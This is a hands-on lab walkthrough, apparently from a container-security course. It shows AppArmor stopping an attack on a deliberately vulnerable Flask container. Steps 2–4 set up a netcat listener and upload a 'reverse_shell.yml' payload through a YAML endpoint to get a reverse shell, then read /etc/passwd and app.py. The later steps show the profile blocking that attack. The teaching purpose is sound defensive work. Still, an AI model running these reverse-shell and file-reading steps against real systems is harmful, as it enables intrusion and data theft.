# **AppArmor**

### *Runtime Protection for Container Workloads*

-------

#### Step 1:

* Navigate to the `AppArmor` directory on the provisioned server.

```
cd /root/container-training/Container/AppArmor/
```

* Multiplex terminal session with `tmux` and split panes horizontally.

```
tmux

tmux split-window -v
```

-------

#### Step 2:

* Go to the lower panel and start a `netcat` listner

```
# Switches to the lower panel
ctrl + b + (lower arrow key) 

nc -l 1337
```

* Go to the upper pane and launch the `abhaybhargav/vul_flask` container

```
# Switches to the upper pane
ctrl + b + (upper arrow key)

docker run -d -p 5050:5050 abhaybhargav/vul_flask
```

-------

#### Step 3:

* Fetch the Public IP Address of the provisioned server

```
serverip
```

* Edit `reverse_shell.yml` by substituting `<IP>` with the Public IP Address fetched in the previous step

```
sed -i -e 's/Server_IP_Here/<IP>/g' reverse_shell.yml
```

**EXAMPLE**: `sed -i -e 's/Server_IP_Here/192.168.1.1/g' reverse_shell.yml`

* Confirm if `reverse_shell.yml` has been edited.

```
cat reverse_shell.yml
```

-------

#### Step 4:

* Upload the edited `reverse_shell.yml` to the `abhaybhargav/vul_flask` application running on port `5000`

```
http --form POST http://<IP>:5050/yaml_hammer file@reverse_shell.yml submit=submit
```

**EXAMPLE**: `http --form POST http://192.168.1.1:5050/yaml_hammer file@reverse_shell.yml submit=submit`

* If the command has successfully executed, the reverse tcp shell in the lower panel should be working. To run commands on the shell, switch to the lower panel.

```
# Switches to the lower panel
ctrl + b + (lower arrow key)
```

* With a reverse-shell on the container, commands can be run on it.

```
ls

cat /etc/passwd

cat app.py
```

* Go back to the upper pane and stop all containers. Running this will terminate the reverse-shell.

```
# Switches to the upper pane
ctrl + b + (upper arrow key)

clean-docker
```

------

### *Let's try and prevent the same attack using `Apparmor`*

----

#### Step 5:

* Load the apparmor profile to the provisioned server

```
apparmor_parser -r -W vul-flask-armor
```

* Launch the same `abhaybhargav/vul_flask` container, with the apparmor profile attached.

```
docker run --rm -d -p 5050:5050 --security-opt apparmor=vul-flask-armor abhaybhargav/vul_flask
```

------

#### Step 6:

* Switch to the lower panel and setup the netcat listner

```
# Switches to the lower panel
ctrl + b + (lower arrow key) 

nc -l 1337
```

* In the upper panel, upload the `reverse_shell.yml` file similar to **Step 4**

```
http --form POST http://<IP>:5050/yaml_hammer file@reverse_shell.yml submit=submit
```

**EXAMPLE**: `http --form POST http://192.168.1.1:5050/yaml_hammer file@reverse_shell.yml submit=submit`

#####  **It can be observed that the reverse-shell was unsuccessful**

------

#### Step 7:

* Fetch the `Container ID` and try to `exec` into the `abhaybhargav/vul_flask` container.

```
docker ps

docker exec -ti <CONTAINER ID> bash
```

**EXAMPLE**: `docker exec -ti fc4e7ea5e6f3 bash`

* Inside the container environment, try to create/access files

```
cat /etc/passwd

touch shell.py

touch /tmp/shell.py
```

#####  **The reverse-shell and the commands do not work because we enabled the runtime security profile with AppArmor**

-----

#### Step 8:

* Exit from the `tmux` sessions and stop all the containers

```
clean-docker
```

---------

### Reading Material/References:
